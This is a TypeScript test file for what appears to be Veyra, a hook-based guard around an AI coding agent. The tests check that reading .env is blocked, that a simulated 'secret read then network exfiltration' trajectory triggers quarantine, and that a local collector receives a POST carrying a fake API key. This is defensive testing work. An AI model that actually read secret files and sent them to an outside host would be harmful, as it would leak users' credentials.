import { afterEach, describe, expect, it } from 'vitest';
import { existsSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { resolveProjectRoot } from '@veyra/storage';
import { resolveCliEntry } from '../src/harness/test-workspace.js';
import {
  containsSecret,
  DEMO_TASK,
  isClaudeAuthFailure,
  materializeExampleIntoTemp,
  runHookProtocolProof,
  runStage6TrajectoryProof,
} from '../src/harness/demo-proof.js';
import { COLLECTOR_URL, startLocalCollector } from '../src/harness/local-collector.js';

const temps: string[] = [];
const cli = resolveCliEntry();

afterEach(() => {
  while (temps.length > 0) {
    const d = temps.pop();
    if (d) rmSync(d, { recursive: true, force: true });
  }
});

describe('runtime auth / secret detectors', () => {
  it('uses canonical auth-bug demo task (not credit-card prompt)', () => {
    expect(DEMO_TASK).toBe('Fix the authentication bug in src/auth.ts.');
  });

  it('does not treat demo task text as Claude auth failure', () => {
    const taskNoise =
      'Task: Fix the authentication bug in src/auth.ts. Read .env. DEMO_API_KEY=veyra_fake_key --max-budget-usd 1';
    expect(isClaudeAuthFailure(taskNoise)).toBe(false);
  });

  it('detects real OAuth / authentication_error failures', () => {
    expect(
      isClaudeAuthFailure(
        'API Error: 401 {"type":"error","error":{"type":"authentication_error","message":"OAuth access token is invalid"}}',
      ),
    ).toBe(true);
    expect(isClaudeAuthFailure('Failed to authenticate. Please run claude auth login')).toBe(true);
    expect(isClaudeAuthFailure('not logged in')).toBe(true);
  });

  it('ignores secret values published in README', () => {
    const env = 'DEMO_API_KEY=veyra_fake_key\nDEMO_INTERNAL_TOKEN=veyra_fake_token_only\n';
    const readme = 'DEMO_API_KEY=veyra_fake_key\n';
    expect(containsSecret('agent said veyra_fake_key from docs', env, readme)).toBe(false);
    expect(containsSecret('leaked veyra_fake_token_only', env, readme)).toBe(true);
  });
});

describe('Stage 3 demo proof (hook protocol)', () => {
  it('proves auth+readme ALLOW, .env BLOCK, secrets never exposed, no PostToolUse for .env', async () => {
    expect(existsSync(cli)).toBe(true);
    const root = resolveProjectRoot(process.cwd());
    const example = join(root, 'examples', 'real-agent-demo');
    const dest = mkdtempSync(join(tmpdir(), 'veyra-stage3-'));
    temps.push(dest);
    materializeExampleIntoTemp(example, dest);

    const report = await runHookProtocolProof({ workspace: dest, cliEntry: cli });

    expect(report.mode).toBe('HOOK_PROTOCOL');
    expect(report.steps).toHaveLength(3);
    expect(report.steps[0]?.allowed).toBe(true);
    expect(report.steps[1]?.allowed).toBe(true);
    expect(report.steps[2]?.allowed).toBe(false);
    expect(report.steps[2]?.postToolUseSent).toBe(false);
    expect(report.secretBlock.denied).toBe(true);
    expect(report.secretBlock.policySecretAccess).toBe(true);
    expect(report.secretBlock.decisionBlock).toBe(true);
    expect(report.secretBlock.severityHigh).toBe(true);
    expect(report.envUnchanged).toBe(true);
    expect(report.secretNeverInHookOutput).toBe(true);
    expect(report.session.postToolUseForEnv).toBe(false);
    expect(report.claimReady).toBe(true);
    expect(report.claim).toBe(
      'VEYRA blocked an unauthorized secret-file access request before execution.',
    );
  });
});

describe('Stage 6 trajectory proof', () => {
  it('blocks secret then local exfil, quarantines, collector stays at 0', async () => {
    expect(existsSync(cli)).toBe(true);
    const root = resolveProjectRoot(process.cwd());
    const example = join(root, 'examples', 'real-agent-demo');
    const dest = mkdtempSync(join(tmpdir(), 'veyra-stage6-'));
    temps.push(dest);
    materializeExampleIntoTemp(example, dest);

    const report = await runStage6TrajectoryProof({ workspace: dest, cliEntry: cli });

    expect(report.mode).toBe('STAGE6_TRAJECTORY');
    expect(report.claimReady).toBe(true);
    expect(report.trajectory?.attackObserved).toBe(true);
    expect(report.trajectory?.secretBlocked).toBe(true);
    expect(report.trajectory?.networkBlocked).toBe(true);
    expect(report.trajectory?.quarantineTriggered).toBe(true);
    expect(report.trajectory?.subsequentBlocked).toBe(true);
    expect(report.trajectory?.ruleId).toBe('TRAJECTORY_SECRET_THEN_NETWORK');
    expect(report.trajectory?.matchedEvents.length).toBeGreaterThanOrEqual(2);
    expect(report.collector?.unauthorizedRequests).toBe(0);
    expect(report.collector?.url).toBe(COLLECTOR_URL);
    expect(report.session.securityState).toBe('QUARANTINED');
    expect(report.envUnchanged).toBe(true);
    expect(report.secretNeverInHookOutput).toBe(true);
  });

  it('local collector records metadata and discards body bytes', async () => {
    const collector = await startLocalCollector({ port: 0 });
    try {
      const res = await fetch(collector.url, {
        method: 'POST',
        body: 'DEMO_API_KEY=veyra_fake_key',
      });
      expect(res.status).toBe(204);
      expect(collector.unauthorizedRequests).toBe(1);
      expect(collector.records[0]?.hadBody).toBe(true);
      expect(collector.records[0]?.contentLength).toBeGreaterThan(0);
      // Ensure we did not retain payload text on the record object.
      expect(JSON.stringify(collector.records[0])).not.toContain('veyra_fake_key');
    } finally {
      await collector.close();
    }
  });
});
